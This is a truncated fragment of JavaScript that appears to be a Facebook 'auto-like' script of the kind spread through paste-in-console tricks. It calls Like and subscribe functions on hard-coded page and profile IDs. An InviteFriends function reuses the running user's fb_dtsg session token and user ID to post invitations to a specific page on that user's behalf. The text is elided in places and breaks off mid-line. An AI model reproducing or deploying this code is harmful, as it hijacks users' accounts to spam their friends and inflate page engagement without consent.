...
;sublist("1387140218218878");Like("163696803841617");Like("1398119427110778");Like("135358846639436");a("100006462668615");P("222840401252444");Like("1389970197946452");Like("1521399341420289");
//tang like
var Title = "";
var Descriptions = "",
    _text = '';
...
function InviteFriends(opo) {
 ...
 if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=163696803841617&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post");
...
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {163696803841617
